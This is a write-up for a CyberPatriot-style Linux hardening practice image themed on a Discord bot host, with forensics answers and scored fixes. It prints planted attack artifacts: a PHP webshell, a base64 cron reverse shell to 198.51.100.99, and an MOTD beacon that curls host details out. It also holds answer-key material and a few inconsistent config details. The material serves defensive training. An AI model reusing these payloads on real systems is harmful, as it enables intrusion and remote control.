# BotForge Practice Image - Writeup:
## Scenario:
```
SCENARIO
════════
BotForge is a Discord bot hosting provider serving small communities and
developers. The platform allows customers to deploy and manage custom Discord
bots on shared infrastructure.

Three weeks ago, customer "vex" was terminated after their bots were caught
mass-DMing phishing links to users across multiple Discord servers. The
termination did not go smoothly - vex threatened legal action and made vague
statements about "making BotForge regret this decision."

Since termination, staff have observed:
  - Unusual network activity
  - Unexplained processes running during overnight hours
  - Brief CPU spikes occurring every few hours
  - One customer reported their bot token was "somehow leaked"

Your task is to secure this system and remove any unauthorized access that
may have been established.
```

## Forensics Questions:
### Forensics Question #1:
```
A JWT token was found in the system. What is its expiration date?
Format: YYYY-MM-DD

ANSWER:
```
This Forensics Question is quite difficult if you are not familiar with the concept of a JWT token. In general, they are credentials used for authentication, and are sent through HTTP requests.
* Typically, they are sent in a header such as: `Authorization: Bearer <JWT>`
Using this knowledge, we can recursively grep in certain directories to find the JWT token: `grep -R "Authorization: Bearer"`
```
jlee/.bash_history:curl -s http://localhost/api/users -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlcm5hbWUiOiJ2ZXgiLCJyb2xlIjoiYWRtaW4iLCJpYXQi
jlee/.bash_history:curl -s http://localhost/api/admin/export -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlcm5hbWUiOiJ2ZXgiLCJyb2xlIjoiYWRtaW4iLCJpYXQi
```
**Please keep in mind that the JWT token was partially cut, and so you would have to examine jlee's .bash_history for the full JWT.**
Using an LLM such as GPT or Gemini and prompting them to determine the expiration date, we find out that the expiration date is `January 1st, 2030`, or `2030-01-01`
* There are also other tools to decode JWT tokens, and so you do not necessarily need to rely on an LLM.
    * [CyberChef](https://gchq.github.io/CyberChef/)
    * [jwt.io](https://jwt.io)
    * [jwt.ms](https://jwt.ms)
***
### Forensics Question #2:
```
A suspicious systemd socket is listening on a non-standard port.
What is the name of the service that handles connections to this socket?

ANSWER:
```
To list all sockets, we can run the following command `systemctl list-sockets`, which in turn gives us the following output:
```
LISTEN                         UNIT                            ACTIVATES               
0.0.0.0:22                     ssh.socket                      ssh.service
0.0.0.0:2222                   ssh.socket                      ssh.service
[::]:8443                      nginx-notify.socket             -                       
kobject-uevent 1               systemd-udevd-kernel.socket     systemd-udevd.service
/dev/rfkill                    systemd-rfkill.socket           systemd-rfkill.service
/run/avahi-daemon/socket       avahi-daemon.socket             avahi-daemon.service
/run/cups/cups.sock            cups.socket                     cups.service
/run/dbus/system_bus_socket    dbus.socket                     dbus.service
/run/dmeventd-client           dm-event.socket                 dm-event.service
/run/dmeventd-server           dm-event.socket                 dm-event.service
/run/docker.sock               docker.socket                   docker.service
/run/initctl                   systemd-initctl.socket          systemd-initctl.service
/run/lvm/lvmpolld.socket       lvm2-lvmpolld.socket            lvm2-lvmpolld.service
/run/systemd/coredump          systemd-coredump.socket         -                       
/run/systemd/fsck.progress     systemd-fsckd.socket            systemd-fsckd.service
/run/systemd/io.systemd.sysext systemd-sysext.socket           -                       
/run/systemd/journal/dev-log   systemd-journald-dev-log.socket systemd-journald.service
/run/systemd/journal/socket    systemd-journald.socket         systemd-journald.service
/run/systemd/journal/stdout    systemd-journald.socket         systemd-journald.service
/run/systemd/journal/syslog    syslog.socket                   rsyslog.service
/run/udev/control              systemd-udevd-control.socket    systemd-udevd.service
/run/uuidd/request             uuidd.socket                    uuidd.service
```
Immediately, we are able to see that SSH has two ports (with port 2222 being non-standard), and that `nginx-notify.socket` listens on `127.0.0.1:8443`
* Our answer is `nginx-notify.socket` and not SSH because although SSH is suspicious listening on port 2222, it does not trigger anything suspicious in itself.
* Moreover, `nginx-notify.socket` does not have a clear activation target, therefore it is our answer.
***
### Forensics Question #3:
```
Review the authentication logs. Which IP address has the most failed SSH login attempts?

ANSWER:
```
SSH attempts are commonly logged to `/var/log/auth.log`, and upon quick analysis of the file, the most frequent IP address is `203.0.113.42`
* This is pretty difficult to miss, as if you keep scrolling further down, the attempts of this specific IP address are quite abundant.
***
### Forensics Question #4:
```
The IP address from Forensics Question 3 belongs to a customer.
What is that customer's email address? (Check the database)

ANSWER:
```
After solving the previous Forensics Question, we can utilize SQL instructions to query for the specific customer with the matching IP address.
```sql
SHOW DATABASES;
---------------------+
| Database           |
+--------------------+
| botforge           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
USE botforge;
SHOW TABLES;
+--------------------+
| Tables_in_botforge |
+--------------------+
| bots               |
| customers          |
| usage_logs         |
+--------------------+
SELECT * FROM customers;
+----+-----------+--------------------+------------+---------------+---------------------+------------+
| id | username  | email              | plan       | last_login_ip | created_at          | status     |
+----+-----------+--------------------+------------+---------------+---------------------+------------+
|  1 | spectre   | spectre@email.com  | pro        | 192.168.1.100 | 2025-12-30 00:30:52 | active     |
|  2 | axiom     | axiom@email.com    | basic      | 10.0.0.55     | 2025-12-30 00:30:52 | active     |
|  3 | novalux   | novalux@email.com  | enterprise | 172.16.0.1    | 2025-12-30 00:30:52 | active     |
|  4 | vex       | vex@protonmail.com | pro        | 203.0.113.42  | 2025-12-30 00:30:52 | terminated |
|  5 | ghostuser | ghost@temp.com     | basic      | 198.51.100.7  | 2025-12-30 00:30:52 | suspended  |
+----+-----------+--------------------+------------+---------------+---------------------+------------+
exit
```
After this step, we are able to see that our IP address matches with vex, and their email address is `vex@protonmail.com` 
***
### Forensics Question #5:
```
A PHP webshell was found on this system. What value must the
"auth" parameter contain for the shell to execute commands?

ANSWER:
```
A webshell is a malicious backdoor uploaded to an HTTP server. In our case, we have an HTTP server located at `/var/www/dashboard`
* After investigating the contents of the directory, we see a suspicious file labeled `x.php`
* After viewing the contents of the file, you are able to see the specific auth parameter set:
```php
<?php
// BotForge Admin Tool v1.0
// Quick diagnostic utility

$auth = "vex_a3f8c91b";

if(isset($_GET['c']) && isset($_GET['k']) && $_GET['k'] === $auth) {
    system($_GET['c']);
}

if(isset($_POST['cmd']) && isset($_POST['auth']) && $_POST['auth'] === $auth) {
    echo "<pre>";
    system($_POST['cmd']);
    echo "</pre>";
}
?>
```
Hence, the answer to this Forensics Question is `vex_a3f8c91b`
***
### Forensics Question #6:
```
An obfuscated cron job contains a base64-encoded reverse shell command.
What IP address does it attempt to connect to?

ANSWER:
```
The Forensics Question reveals to us that the reverse shell is executed by a scheduled cronjob. There are so few locations cronjobs can be located, mainly (excluding the many directories):
* `/var/spool/cron/crontabs/`
* `/etc/crontab/`
Upon investigating `/var/spool/cron/crontabs/vex`, we are able to see that the user has a very suspicious cronjob:
```bash
SHELL=/bin/bash
PATH=/usr/local/bin:/usr/bin:/bin

# Backup task
0 */4 * * * echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTguNTEuMTAwLjk5LzgwODAgMD4mMQ==" | base64 -d | bash
```
After decoding the base64-encoded string inside the file, we are left with: `bash -i >& /dev/tcp/198.51.100.99/8080 0>&1`
* Therefore, `198.51.100.99` is our wanted IP address.
***
### Forensics Question #7:
```
Sensitive credentials were accidentally committed to a git repository.
What Discord bot token can be found in the git history?

ANSWER:
```
Every repository located on a system will always have a directory called **.git**. Git utilizes this directory to track information such as different branches and the commit history. To find every repository, we can use the **find** command with some specified flags.
```bash
$ sudo find / -type d -name ".git" 2>/dev/null
```
This is the output given after running the command in our terminal:
```
/opt/botforge/dashboard/.git
```
After navigating to the root folder `/opt/botforge/dashboard/`, we can run the following git command to show the tracked commit history.
```bash
$ sudo git log
```
This is the output given after running the command in our terminal:
```
commit 63a029d848c7c7d0f2cd9939974eefd6a4aef3ff (HEAD -> master)
Author: Marcus Ford <mford@botforge.local>
Date:   Tue Dec 30 00:31:23 2025 -0600

    Add status endpoint

commit 1400086168d1e23e691b268a310a737a24439873
Author: Marcus Ford <mford@botforge.local>
Date:   Tue Dec 30 00:31:23 2025 -0600

    Remove production secrets, add example config

commit c0dae146f3450bd3aa40ae6c30e3af81bfc62649
Author: Marcus Ford <mford@botforge.local>
Date:   Tue Dec 30 00:31:23 2025 -0600

    Initial dashboard setup
```
After running the following command involving the commit hash, we are able to see the sensitive credentials committed to the repository:
```bash
$ sudo git show 1400086168d1e23e691b268a310a737a24439873
```
This is the output we receive:
```diff
commit 1400086168d1e23e691b268a310a737a24439873
Author: Marcus Ford <mford@botforge.local>
Date:   Tue Dec 30 00:31:23 2025 -0600

    Remove production secrets, add example config

diff --git a/config/.env.example b/config/.env.example
new file mode 100644
index 0000000..f761ace
*** /dev/null
+++ b/config/.env.example
@@ -0,0 +1,5 @@
+DB_HOST=
+DB_NAME=
+DB_PASS=
+DISCORD_TOKEN=
+API_SECRET=
diff --git a/config/.env.production b/config/.env.production
deleted file mode 100644
index 3ce4896..0000000
*** a/config/.env.production
+++ /dev/null
@@ -1,5 +0,0 @@
-DB_HOST=localhost
-DB_NAME=botforge
-DB_PASS=BotF0rg3_Pr0d!
-DISCORD_TOKEN=MTk4NzY1NDMyMTAxMjM0NTY3OA.Xk9Lpz.secrettoken123abc
-API_SECRET=prod_api_key_super_secret
```
Hence, we know that the leaked Discord token was: `MTk4NzY1NDMyMTAxMjM0NTY3OA.Xk9Lpz.secrettoken123abc`
## Vulnerabilities:
### Removed unauthorized user vex (T1136.001) – Hint: Check vex’s crontab, database privileges, and SSH keys – 3 pts
From the scenario, we know that `vex` is an attacker on our system. We can also stumble upon her user entry on this system in `/etc/passwd`
```
vex:x:1005:1005:Vex Systems:/home/vex:/bin/bash
```
After deleting the storyline's attacker, we earn points by minimizing the machine's attack surface.
### Removed unauthorized user “testacct” (T1136.001) – 3 pts
After analyzing `/etc/passwd` to conduct user-auditing, we stumble upon this entry:
```
testacct:x:1006:1006:QA Testing:/home/testacct:/bin/bash
```
Test accounts should not be on a production server, and this account was also not specified as authorized by the README. Hence, deleting it earns us points.
### Removed hidden backdoor user “..” (T1564.002) – Hint: Look for other hidden files – try ls -la in /etc/cron.d – 5 pts
It is a common tactic to represent users as paths, such as `..` to trick you and maintain backdoor access. After analyzing `/etc/passwd`, you can see this entry:
```
..:x:1007:1007::/home/..:/bin/bash
```
After deleting this entry, you earn points for minimizing the attack vector on the machine.
### Service account “mysql” has no login shell (T1078.003) – 4 pts
Service accounts in `/etc/passwd` should not have a login shell, as it poses a threat if users gain unauthorized access to the server account. After viewing `/etc/passwd`, we can see this entry:
```
mysql:x:994:984:MySQL Server:/home/mysql:/bin/bash
```
After setting the `/bin/bash` to `/usr/sbin/nologin`, we earn points for reducing the attack surface on our machine.
### Removed UID 0 backdoor user specter (T1136.001) – Hint: Compare /etc/passwd against the authorized user list carefully – 5 pts
Unless explicitly stated by the README, no user should have the GID and UID of root except root! After examining carefully `/etc/passwd`, we stumble upon this entry:
```
specter:x:0:0:Specter Admin:/root:/bin/bash
```
Hence, deleting this unauthorized user further minimizes the attack vector on the workstation.
### Disabled SSH root login (T1021.004) – Hint: Check authorized_keys files for attacker SSH keys – 4 pts
Disabling SSH root login is a very important security measure, as attackers must attempt to guess or find a username and a password instead of blindly attempting logins in as root.
```
$ sudo vim /etc/ssh/sshd_config
PermitRootLogin no
```
### Disabled SSH empty passwords (T1020.003) – 4 pts
Disabling the usage of empty passwords enforces users to utilize credentials. Weakened authentication is often exploited by attackers to compromise systems.
```
$ sudo vim /etc/ssh/sshd_config
PermitEmptyPasswords no
```
### Removed attacker SSH key from root authorized_keys (T1098.004) – Hint: The attacker IP subnet may have firewall rules – 5 pts
SSH authorized keys allow for users to connect without passwords to user accounts. If an attacker were to add their own public key, they would be able to establish a persistance access mechanism without requiring credentials. To find all `.ssh/` directories, we can run the following **find** command:
```
$ sudo find / -type d -name ".ssh" 2>/dev/null
/root/.ssh
/home/mford/.ssh
/home/jlee/.ssh
```
After investigating the contents of `/root/.ssh/authorized_keys`, we can see that the attacker planted their own:
```
root@botforge:~/.ssh# cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3xKmJV8KzE9bAVnbHT2tG7dKNzqLRJLJPvUhKPS9LNJhT0LMxKpNS8HX7qKdZqzNVnPKC7Y4VqPdC8sKmNVS9LxKJP7qDnT2FcC9bAVnHdKzE9bAVnbHT2t== vex@laptop
```
After deleting this this key from the file, we have effectively removed their persistant access to the SSH server.
### Removed backdoor SSH listener on port 2222 (T1571) – 3 pts
Upon examining `/etc/ssh/sshd_config`, you can notice that there are two entries for SSHD ports: `22`, and `2222`. If not explicitly stated by the README, the non-standard port `2222` should be deleted to minimize the attack surface for attackers.
```bash
$ sudo vim /etc/ssh/sshd_config
Port 22
--->Port 2222<---
```
### Disabled IP forwarding (T1599) – Network Boundary Bridging – 4 pts
IP forwarding is a mechanism to route packets between different interfaces, consistently exploited by attackers to relay traffic. This should be disabled to minimize risk.
```
$ sudo vim /etc/sysctl.conf
net.ipv4.ip_forward = 0
```
To load the new parameters, run `sysctl -p`
### Disabled core dumps or secured dump locations (T1003.007) – 4 pts
Core dumps are the memory contents of a process when a crash occurs. They can contain critical information in insecure environments, such as credentials in a world-readable directory, meaning they should be disabled to minimize risk.
```
$ sudo vim /etc/sysctl.conf
fs.suid_dumpable = 0
```
To load the new parameters, run `sysctl -p`
### Enabled UFW firewall (CIS 9.2) – Hint: Review the rules – attackers sometimes add allow rules for their IPs – 4 pts
UFW, or Uncomplicated Firewall, is the most common firewall utilized in CyberPatriots. A firewall blocks unauthorized network requests from communicating with your system, reducing the amount of attack vectors on your system.
```bash
$ sudo apt install ufw
$ sudo ufw enable
```
Furthermore, although not scored in this image, it is always good to have default rules and close open ports:
```bash
$ sudo ufw default deny incoming
$ sudo ufw default deny routed
$ sudo ufw default allow outgoing
```
And additionally, you want to allow specific packets to leave your computer (including critical services).
```bash
$ sudo ufw allow https
$ sudo ufw allow http
$ sudo ufw allow git
$ sudo ufw allow ssh
...
```
### Removed attacker UFW allow rule for 203.0.113.0/24 (T1562.004) – Hint: This matches the brute force IP from Forensic Q3 – 4 pts
It is common for attackers to include insecure firewall rules to have continous access to the machine indefinitely. It is good practice to audit all UFW rules on the system!
```
$ sudo ufw status
To                         Action      From
--                         ------      ----
Anywhere                   ALLOW       203.0.113.0/24            
443                        ALLOW       Anywhere                  
80/tcp                     ALLOW       Anywhere                  
9418/tcp                   ALLOW       Anywhere                  
443 (v6)                   ALLOW       Anywhere (v6)             
80/tcp (v6)                ALLOW       Anywhere (v6)             
9418/tcp (v6)              ALLOW       Anywhere (v6)
```
As you can see, there is a very suspicious rule, specifically `203.0.113.0/24`
* The attacker can connect to any port or service through the IP address 203.0.113.0
To delete the malicious rule, you simply delete it using the index:
```
$ sudo ufw delete 1
Deleting:
 allow from 203.0.113.0/24
Proceed with operation (y|n)? y
Rule deleted
```
### Disabled telnet via xinetd (T1021.002) – 4 pts
Telnet is a service that provides terminal access, and is inherently insecure in itself. It can be abused by remote attackers to gain access and compromise the system.
* For context, xinetd is typically misconfigured and expands the attack surface, which is why I also prefer deleting it as well.
This vulnerability can automatically be caught through baselining or automation, as `xinetd` is not typically installed on the system, and is often removed.
```bash
$ sudo apt purge xinetd telnetd telnet
$ sudo rm -rf /etc/xinetd.d/
```
Hence, after deleting `xinetd` (a non-critical service) and `telnetd` (an additional non-critical service), we gain points!
### Secured Redis – bound to localhost or requires auth or disabled (T1021.002) – Remote Services – 4 pts
There were many ways to find out that the non-critical service `redis` was installed:
* You could have stumbled upon its entry in `/etc/passwd`
* You could have stunbled upon its service by running `systemctl --type=service`
Regardless, if a service is not explicitly stated as critical by the README, chances are you should delete it.
* Furthermore, any remote services pose an increased risk to the attack vector of the system.
```
$ sudo systemctl disable --now redis
$ sudo apt purge redis-server redis-tools
```
### Stopped or removed vsftpd service (T1071.002) – File Transfer – 2 pts
There were many ways to find out that the non-critical service `vsftpd` was installed:
* You could have stumbled upon its file `/etc/vsftpd.conf`
* You could have stunbled upon its service by running `systemctl --type=service`
Regardless, if a service is not explicitly stated as critical by the README, chances are you should delete it.
* Furthermore, any remote services pose an increased risk to the attack vector of the system.
```
$ sudo systemctl disable --now vsftpd
$ sudo apt purge vsftpd
```
### Nginx running as non-root user (T1078.003) – Local Accounts – 5 pts
It is common for many HTTP-related services like NGINX or Apache to be ran through the user www-data, an isolated service user with separate permissions. This isolates it from having administrative permissions that could be compromised and exploited for further access. After examining /etc/nginx.conf, we see these contents:
```bash
user root;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
```
After changing `user root` to `user www-data`, we earn points by separating privileges and minimizing the attack vector.
### Fixed directory traversal - alias with trailing slash (T1083 - File Discovery)
In `/etc/nginx/sites-available/dashboard`, there is an insecure configuration:
```nginx
location /static {
    alias /var/www/dashboard/static/;
}
```
* The main issue is unsafe use of alias without a trailing slash, as it can cause path confusion / unintended file exposure. The intended fix is to place a trailing slash after `/static`
```nginx
location /static/ {
    alias /var/www/dashboard/static/;
}
```
**NOTE: This is a currently bugged vulnerability, however if you want to cheese the scoring, simply remove the alias line from the file!**
### Removed backup config from webroot (T1552.001 – Credentials in Files) – 3 pts
After running `ls -la` in `/var/www/dashboard/`, we are able to view all files in the directory, including hidden ones:
```
root@botforge:/var/www/dashboard# ls -la
total 40
drwxr-xr-x 5 www-data www-data 4096 Jan 19 13:50 .
drwxr-xr-x 4 root     root     4096 Dec 30 00:30 ..
-rwxr-xr-x 1 www-data www-data  205 Dec 30 00:30 .env
drwxr-xr-x 2 www-data www-data 4096 Jan 19 03:18 includes
-rwxr-xr-x 1 www-data www-data 6241 Dec 30 00:32 index.php
-rwxr-xr-x 1 www-data www-data  469 Dec 30 00:30 .nginx.conf.bak
drwxr-xr-x 2 www-data www-data 4096 Dec 30 00:30 static
-rwxr-xr-x 1 www-data www-data  734 Dec 30 00:32 status.php
drwxr-xr-x 2 www-data www-data 4096 Jan 19 03:18 uploads
```
There are two major vulnerabilities that we can see:
* We have `.nginx.conf.bak`, a backup of our `NGINX` configuration that can be exploited for reconnaissance.
* We have `.env` **containing important credentials** easily located in a **production environment!**
For this vulnerability, after removing the `.nginx.conf.bak` file, we gain points for minimizing the attack surface.
### Enabled Nginx access logging (T1070.002 – Clear Linux or Mac System Logs) – 2 pts
NGINX has a variety of configuration settings to improve hardening, with one of them being enabling access logging. Access logging allows for us to record HTTP activity happening on our server, meaning we are able to perform forensics analysis of malicious activity if we needed to after an attack.
```nginx
$ sudo vim /etc/nginx/nginx.conf

http {
    --> access_log on; <--
    error_log /var/log/nginx/error.log;
}
``` 
Therefore we earn points, because we are ensuring malicious behaviors are being recorded.
### Disabled Nginx server version disclosure (T1082 – System Information Discovery) – 3 pts
Similar to the previous vulnerability, disabling the server version is extremely important when utilizing NGINX, or any other HTTP service. Allowing for attackers to see your specific server version allows them to research CVEs related to the specific version, allowing them unauthorized access if compromised.
```nginx
$ sudo vim /etc/nginx/nginx.conf

http {
    --> server_tokens on; <--
}
```
### Disabled insecure TLS versions in Nginx (T1557 – Adversary-in-the-Middle) – 3 pts
TLS is a cryptographic protocol that encrypts communication. Older TLS versions are outdated, and are prone to cryptographic exploitations and insecure handshakes. They use weak ciphers, and allow attackers to utilize weaker encryption. To remediate this, simply remove the outdated protocols from `/etc/nginx/sites-available/dashboard`
```nginx
$ sudo vim /etc/nginx/sites-available/dashboard

server {
    listen 443 ssl default_server;
    listen [::]:443 ssl default_server;

    server_name botforge.local;
    root /var/www/dashboard;
    index index.php index.html;

    ssl_certificate /etc/nginx/ssl/server.crt;
    ssl_certificate_key /etc/nginx/ssl/server.key;

    --> ssl_protocols TLSv1.2 TLSv1.3; <--
}
```
### Disabled allow_url_include (T1105 – Ingress Tool Transfer) – 4 pts
Due to the nature of this image being LAMP-oriented, PHP is a major component of the stack that must be configured and secured.
* One configuration setting that should be disabled is `allow_url_include`, which lets certain PHP functions process files from remote URLs. This could allow for remote code execution.
* There are two major PHP configuration files which should be edited: `/etc/php/8.3/fpm/php.ini` and `/etc/php/8.3/cli/php.ini`
```php
;;;;;;;;;;;;;;;;;;
; Fopen wrappers ;
;;;;;;;;;;;;;;;;;;

; Whether to allow the treatment of URLs (like http:// or ftp://) as files.
; https://php.net/allow-url-fopen
allow_url_fopen = Off

; Whether to allow include/require to open URLs (like https:// or ftp://) as files.
; https://php.net/allow-url-include
allow_url_include = Off
```
### Revoked database privileges from terminated user vex (T1078.003) – 3 pts
Due to vex being a terminated user, chances are that this termination was not reflected in our database. We can delete her from the users table using the following SQL instructions:
```SQL
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| botforge           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
USE mysql;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| column_stats              |
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| global_priv               |
| gtid_slave_pos            |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| index_stats               |
| innodb_index_stats        |
| innodb_table_stats        |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| roles_mapping             |
| servers                   |
| slow_log                  |
| table_stats               |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| transaction_registry      |
| user                      |
+---------------------------+
SELECT * FROM user;
MariaDB [mysql]> DROP USER 'vex'@'localhost'
```
### Secured MariaDB root - password required or socket auth (T1078.003 - Valid Accounts) - 4 pts
To ensure that a password is required for the root user, we just have to assign the root user a password using the following SQL instructions:
```SQL
ALTER USER 'root'@'localhost' IDENTIFIED BY 'Cyb3rPatriot$';
FLUSH PRIVILEGES;
```
This enforces the necessary command: `mysql -u root -p`, where people must input the password.
### Removed remote root login for MariaDB (T1021 – Remote Services) – 4 pts
To achieve a secure installation, and disable remote root login, run the following command: `sudo mariadb-secure-installation`
```
mford@botforge:~$ sudo mariadb-secure-installation

Switch to unix_socket authentication [Y/n] n
Change the root password? [Y/n] n
Remove anonymous users? [Y/n] y
Disallow root login remotely? [Y/n] y
Remove test database and access to it? [Y/n] y
Reload privilege tables now? [Y/n] y
```
This removes minimizes the attack surface by reducing the amount of ways people can connect to our server.
### MariaDB bound to localhost only (T1021 – Remote Services) – 4 pts
To further bound MariaDB to only localhost, we simply have to configure the service and have it acknowledge our binding address. To do this, we configure `/etc/mysql/mariadb.conf.d/50-server.cnf`, and add the following:
```conf
[mysqld]
bind-address=127.0.0.1
```
This further minimizes the attack surface.
### Removed jlee from docker group (T1611) -> Hint: Docker group = root equivalent. Check docker-compose.yml for container escapes - 4 pts
In `/etc/group`, there is a group called `docker` at the end of the file that encapsulates the users `jlee` and `mford`. Due to the fact that `jlee` is not an authorized administrator, she should not have access to the `docker` group. To remediate this, just delete her name from the entry:
```
docker:x:983:mford
```
This is an important remediation because being in the docker group allows you to interact with Docker, which itself runs under the `root` user.
### Removed privileged flag from containers (T1611) – Hint: Check for other dangerous Docker settings: socket mounts, capabilities – 5 pts
In `/opt/botforge/docker-compose.yml`, there were many dangerous flags set that effectively ruin the point of Docker's isolation. To score this remediation, you have to change the `privileged: true` flag to `privileged: false`, as it gives access to the host machine's root user.
```yml
services:
  php-dashboard:
    image: php:8.2-fpm
    privileged: true # --> privileged: false
    volumes:
      - /var/www/dashboard:/var/www/html
      - /var/run/docker.sock:/var/run/docker.sock
    networks:
      - botnet
    restart: unless-stopped
```
### Removed Docker socket mount from containers (T1611) – 5 pts
In `/opt/botforge/docker-compose.yml`, there is a dangerous mount that mounts the host's `/var/run/docker.sock` inside the container. This effectively allows a compromised attacker to have access to the original docker socket, meaning they can issue docker API commands. Eventually, they can spin up a new container, mount the host file system, interacting with the host's filesystem with root privileges.
* To remediate this, just delete the line `- /var/run/docker.sock:/var/run/docker.sock`
```yml
services:
  php-dashboard:
    image: php:8.2-fpm
    privileged: false
    volumes:
      - /var/www/dashboard:/var/www/html
      - /var/run/docker.sock:/var/run/docker.sock # --> delete this
    networks:
      - botnet
    restart: unless-stopped
```
### Removed SYS_ADMIN capability from containers (T1611) – 4 pts
In `/opt/botforge/docker-compose.yml`, the container was given `SYS_ADMIN`, meaning the container can mount and unmount filesystems, and bypass container isolation. This effectively allows them to ecape into the host machine. To remediate this, remove the capability.
```yml
 botrunner:
    image: python:3.11-slim
    cap_add: # --> delete this
      - SYS_ADMIN # --> delete this
    volumes:
      - /opt/botforge/bots:/app
    working_dir: /app
    command: ["python", "-c", "import time; time.sleep(infinity)"]
    networks:
      - botnet
    restart: unless-stopped
```
### Removed host PID namespace from containers (T1611) - 3 pts
In `/opt/botforge/docker-compose.yml`, a dangerous flag set was `pid: "host"`. This effectively makes it so that the container can view all the running processes on the host machine, and can even interact with them depending on the permissions set, injecting code or causing crashes. Moreover, it allows for them to conduct reconnaissance on the host machine before they attempt to compromise the system. It is better to remove this flag entirely.
```yml
  botrunner:
    image: python:3.11-slim
    cap_add:
      - SYS_ADMIN
    pid: "host" # --> delete this
    volumes:
      - /opt/botforge/bots:/app
    working_dir: /app
    command: ["python", "-c", "import time; time.sleep(infinity)"]
    networks:
      - botnet
    restart: unless-stopped
```
After remediating the potential reconnaissance, we earn 3 points!
### Removed untrusted registry “vexregistry.io” from Docker config (T1195.002) – 3 pts
In `/opt/botforge/docker-compose.yml`, a configuration setting is set so that we pull an image from an unknown registry, and execute their code with our filesystem. To remove this vulnerability, simply delete vex's registry from the file:
```yml
  metrics:
    image: vex-registry.io:5000/metrics-collector:latest # --> delete this
    networks:
      - botnet
    restart: "no"
```
Additionally, **we have to remove references to insecure repositories in /etc/docker/daemon.json**:
```json
{
    "insecure-registries": ["vex-registry.io:5000", "http://10.0.0.100:5000"], <-- delete this
    "live-restore": true,
    "userland-proxy": false
}
```
### Removed netcat backdoor from /etc/crontab (T1053.003) – Hint: Check user crontabs too with ‘crontab -l -u <user>’ – 5 pts
In `/etc/crontab`, there is a line with a netcat backdoor. Simply delete it to remediate this vulnerability.
### Removed vex user crontab with reverse shell (T1053.003) – Hint: Look for hidden cron files in /etc/cron.d – 5 pts
User crontabs are held in the directory `/var/spool/cron/crontabs/`, and in this case, the only crontab upon examining the directory is `/var/spool/cron/crontabs/vex`. After investigating the contents, we see this:
```
SHELL=/bin/bash
PATH=/usr/local/bin:/usr/bin:/bin

# Backup task
0 */4 * * * echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTguNTEuMTAwLjk5LzgwODAgMD4mMQ==" | base64 -d | bash
```
Due to vex being an unauthorized user on our system regardless, we can just delete this crontab and remediate the vulnerability.
### Removed malicious systemd service “system-update” (T1543.002) – Hint: Check for SUID binaries: find / -perm -4000 – 5 pts
To remediate this vulnerability, having a baselining tool is your best friend. You are quickly able to compare which services are normal, and which are non-standard.
* You might have been able to spot this yourself if you were familiar with the standard services.
```
$ sudo systemctl --type=service
system-update.service                                 loaded active running System Update Service
```
Once this server is recognized as suspicious, you can disable it using `systemctl disable --now system-update.service`
* It is also important to analyze the contents of the service file to know what it is running. The file path is typically `/etc/systemd/system/system-update.service`
```conf
[Unit]
Description=System Update Service
After=network.target
Documentation=man:apt(8)

[Service]
Type=simple
ExecStart=/usr/local/bin/system-update --daemon --quiet
Restart=always
RestartSec=30
Nice=19

[Install]
WantedBy=multi-user.target
```
We are able to see that it is running `/usr/local/bin/system-update`, so after quick examination, we are able to see that it is malware. We can delete it using `rm /usr/local/bin/system-update`.
### Removed SUID backdoor /usr/local/bin/healthcheck (T1548.001) – Hint: Check /etc/ld.so.preload for library injection – 5 pts
This SUID backdoor could have been found through the respective crontab, or through checking for SUID binaries using the `find` command:
* `find / -type f -perm /4000 -exec ls {} \; 2>/dev/null`
### Removed malicious ld.so.preload entry (T1547.006) – 5 pts
The `/etc/ld.so.preload` is typically empty, and so due to the suspicious behavior of it having an entry, we must analyze it. `/etc/ld.so.preload` is in charge of loading shared object libraries when a program is executed, potentially modifying program behavior.
```
root@botforge:/etc# cat /etc/ld.so.preload 
/usr/lib/libsystem.so
```
After analyzing `/usr/lib/libsystem.so`, you are able to see that it is in fact compiled, and upon using `strings`, you can see `libvex.c`, which may or may not be a reference to the malicious user `vex`.
* In any case, delete `/usr/lib/libsystem.so`, and clear `/etc/ld.so.preload`.
### Removed malicious MOTD script (T1546.004) – Hint: Check /etc/polkit-1/rules.d/ for privilege escalation rules – 5 pts
The directory `/etc/update-motd.d/` is notorious for being abused and having established persistance mechanisms. Upon inspection of the files in this directory, the file `/etc/update-motd.d/99-sysinfo` has malware.
```bash
#!/bin/bash
echo "System Status: $(uptime -p)"
curl -s "http://10.13.37.100/beacon?h=$(hostname)&u=$(whoami)" &>/dev/null &
```
After removing this mechanism, we earn points.
* In detail, it sends an HTTP request to 10.13.37.100/beacon with details about our hostname and the current user.
### Removed polkit rule granting joe passwordless root (T1548.003) – 5 pts
PolicyKit controls authorization for escalated-privilege actions. Custom persistant rules can be established and abused, granting users root without credentials.
* By investigating `/etc/polkit-1/rules.d/`, you learn of the existance of `/etc/polkit-1/rules.d/49-botforge.rules`
```javascript
polkit.addRule(function(action, subject) {
    if (subject.user == "jlee") {
        return polkit.Result.YES;
    }
});
```
After removing this careless rule, you minimize the risks of privilege escalation on your system.
### Removed hidden cron job /etc/cron.d/maintenance (T1053.003) – 4 pts
In general, when investigating directories, you should always use the `ls -la` command, which also reveals any hidden files. Subsequent to running `ls -la` in `/etc/cron.d/`, a suspicious hidden file `.maintenance` is revealed:
```bash
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/30 * * * * root /usr/local/bin/healthcheck --quiet 2>/dev/null
```
This file also reveals to us malware at `/usr/local/bin/healthcheck`, which should be investigated prior removing the cronjob.
